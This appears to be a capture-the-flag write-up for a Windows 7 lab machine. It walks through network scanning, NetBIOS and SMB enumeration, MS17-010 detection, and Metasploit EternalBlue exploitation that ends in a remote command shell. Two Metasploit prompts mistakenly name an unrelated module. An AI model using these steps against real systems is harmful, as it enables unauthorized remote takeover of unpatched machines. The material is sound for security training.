# CTF - BLue

## Scanning and Enumeration

### 1. Nmap scan to discover victim

	sudo nmap -sn 192.168.100.1/24

Result : ./discovery-scan
Target IP : 192.168.100.208

### 2. Scanning Target IP

	sudo nmap -A -sC -sV 192.168.100.208

Result : ./nmap-initial

#### Open Ports: 

- 135/tcp msrpc v: Microsoft Windows RPC
- 139/tcp netbios-ssn v: Microsoft Windows netbios-ssn
- 445/tcp microsoft-ds v: Windows 7 Ultimate 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
- 5357/tcp http v: Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
- 49152/tcp msrpc v: Microsoft Windows RPC
- 49153/tcp msrpc V: Microsoft Windows RPC
- 49154/tcp msrpc V: Microsoft Windows RPC
- 49155/tcp msrpc V: Microsoft Windows RPC
- 49156/tcp msrpc V: Microsoft Windows RPC
- 49157/tcp msrpc V: Microsoft Windows RPC

#### operating System

Running: Microsoft Windows 7|2008|8.1
OS CPE: cpe:/o:microsoft:windows_7::- cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_server_2008::sp1 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_8.1
OS details: Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1

### 3. Enumerating ports

- Two ports that catch our interest are 139 and 445.
- 139 is running NetBIOS over TCP/IP.
- 445 is running SMB server.

#### Port 139

NBTSCAN:

- We can take use of the tool called 'nbtscan' to gather more info about this server.

		$>> sudo nbtscan 192.168.100.208

		Doing NBT name scan for addresses from 192.168.100.208
		.
		IP address       NetBIOS Name     Server    User             MAC address      
		.
		192.168.100.208  WIN-845Q99OO4PP  <server>  <unknown>        08:00:27:2a:95:91

- This data gives us information of the nbt machine service, the name, IP address and its MAC address.

		$>> sudo nbtscan -v -r 192.168.100.208

		Doing NBT name scan for addresses from 192.168.100.208
		.
		NetBIOS Name Table for Host 192.168.100.208:
		.
		Incomplete packet, 209 bytes long.
		Name             Service          Type             
		.
		WIN-845Q99OO4PP  <00>             UNIQUE
		WORKGROUP        <00>              GROUP
		WIN-845Q99OO4PP  <20>             UNIQUE
		WORKGROUP        <1e>              GROUP
		WORKGROUP        <1d>             UNIQUE
		__MSBROWSE__  <01>              GROUP
		.
		Adapter address: 08:00:27:2a:95:91

- using -v and -r flag, the tool produce a verbose output mentioning the services and its types running on the machine.

		$>> sudo nbtscan -h -v -r 192.168.100.208

		Doing NBT name scan for addresses from 192.168.100.208
		.
		NetBIOS Name Table for Host 192.168.100.208:
		.
		Incomplete packet, 209 bytes long.
		Name             Service          Type             
		.
		WIN-845Q99OO4PP  Workstation Service
		WORKGROUP        Domain Name
		WIN-845Q99OO4PP  File Server Service
		WORKGROUP        Browser Service Elections
		WORKGROUP        Master Browser
		__MSBROWSE__  Master Browser
		.
		Adapter address: 08:00:27:2a:95:91
	
- It shows infomation in human readable format.

#### Port 445

SMBCLIENT:

- Use of smbclient to try connect and list its shared content.
- Also to make sure if it allows anonymous logins.

		$>> sudo smbclient -L 192.168.100.208
		Enter WORKGROUP\root's password: 
		.
			Sharename       Type      Comment
			.
			ADMIN$          Disk      Remote Admin
			C$              Disk      Default share
			IPC$            IPC       Remote IPC
		Reconnecting with SMB1 for workgroup listing.
		do_connect: Connection to 192.168.100.208 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
		Unable to connect with SMB1 -- no workgroup available

- -L flag use to list all the shares on Host.

		$>> sudo smbclient -U anonymous -L 192.168.100.208
		Enter WORKGROUP\anonymous's password: 
		.
			Sharename       Type      Comment
			.
			ADMIN$          Disk      Remote Admin
			C$              Disk      Default share
			IPC$            IPC       Remote IPC
		Reconnecting with SMB1 for workgroup listing.
		do_connect: Connection to 192.168.100.208 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
		Unable to connect with SMB1 -- no workgroup available

- Trying to login with anonymous. NO LUCK ;)


NMAP SCRIPTS:

	$>> sudo nmap -p445 --script=smb-os-discovery 192.168.100.208
	
	Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-08 03:12 PKT
	Nmap scan report for 192.168.100.208
	Host is up (0.69s latency).
	.
	PORT    STATE SERVICE
	445/tcp open  microsoft-ds
	MAC Address: 50:3E:AA:20:11:4B (Tp-link Technologies)
	.
	Host script results:
	| smb-os-discovery: 
	|   OS: Windows 7 Ultimate 7601 Service Pack 1 (Windows 7 Ultimate 6.1)
	|   OS CPE: cpe:/o:microsoft:windows_7::sp1
	|   Computer name: WIN-845Q99OO4PP
	|   NetBIOS computer name: WIN-845Q99OO4PP\x00
	|   Workgroup: WORKGROUP\x00
	|_  System time: 2022-02-07T17:10:46-05:00
	.
	Nmap done: 1 IP address (1 host up) scanned in 6.05 seconds

- The above script gave information about the OS.


		$>> sudo nmap -p445 --script=smb-enum-shares 192.168.100.208
		
		Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-08 03:14 PKT
		Nmap scan report for 192.168.100.208
		Host is up (0.16s latency).
		.
		PORT    STATE SERVICE
		445/tcp open  microsoft-ds
		MAC Address: 50:3E:AA:20:11:4B (Tp-link Technologies)
		.
		Host script results:
		| smb-enum-shares: 
		|   account_used: guest
		|   \\192.168.100.208\ADMIN$: 
		|     Type: STYPE_DISKTREE_HIDDEN
		|     Comment: Remote Admin
		|     Anonymous access: <none>
		|     Current user access: <none>
		|   \\192.168.100.208\C$: 
		|     Type: STYPE_DISKTREE_HIDDEN
		|     Comment: Default share
		|     Anonymous access: <none>
		|     Current user access: <none>
		|   \\192.168.100.208\IPC$: 
		|     Type: STYPE_IPC_HIDDEN
		|     Comment: Remote IPC
		|     Anonymous access: READ
		|_    Current user access: READ/WRITE
		.
		Nmap done: 1 IP address (1 host up) scanned in 1.69 seconds

- This script gave information about the shares this smb server have.

### 4. Scanning for vulnerability.

	$>> sudo nmap -p445 --script=smb-vuln-* 192.168.100.208

	Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-08 03:18 PKT
	Nmap scan report for 192.168.100.208
	Host is up (0.12s latency).
	.
	PORT    STATE SERVICE
	445/tcp open  microsoft-ds
	MAC Address: 50:3E:AA:20:11:4B (Tp-link Technologies)
	.
	Host script results:
	|_smb-vuln-ms10-054: false
	| smb-vuln-ms17-010: 
	|   VULNERABLE:
	|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
	|     State: VULNERABLE
	|     IDs:  CVE:CVE-2017-0143
	|     Risk factor: HIGH
	|       A critical remote code execution vulnerability exists in Microsoft SMBv1
	|        servers (ms17-010).
	|           
	|     Disclosure date: 2017-03-14
	|     References:
	|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
	|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
	|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
	|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
	Nmap done: 1 IP address (1 host up) scanned in 5.66 seconds

- Ran the nmap script to disclose the vulnerbility.

### 5. Exploitation

- Use of Metasploit to attack the machine using 'EternalBlue' exploit.

1.	msf > use exploit/windows/smb/ms17_010_eternalblue
2.	exploit(windows/smb/ms17_010_eternalblue) >  show targets
	
		Exploit targets:
		.
	   	Id  Name
	   	.
	    	0   Automatic Target
	   	1   Windows 7
	   	2   Windows Embedded Standard 7
	   	3   Windows Server 2008 R2
	   	4   Windows 8
	   	5   Windows 8.1
	   	6   Windows Server 2012
	   	7   Windows 10 Pro
	   	8   Windows 10 Enterprise Evaluation

3.	msf exploit(navigate_cms_rce) > set TARGET 0

4.	msf exploit(navigate_cms_rce) > show options

5.	exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.100.208

6.	exploit(windows/smb/ms17_010_eternalblue) > exploit

		meterpreter > shell
		Process 1080 created.
		Channel 1 created.
		Microsoft Windows [Version 6.1.7601]
		Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

		C:\Windows\system32>

- We have pawned the machine!!
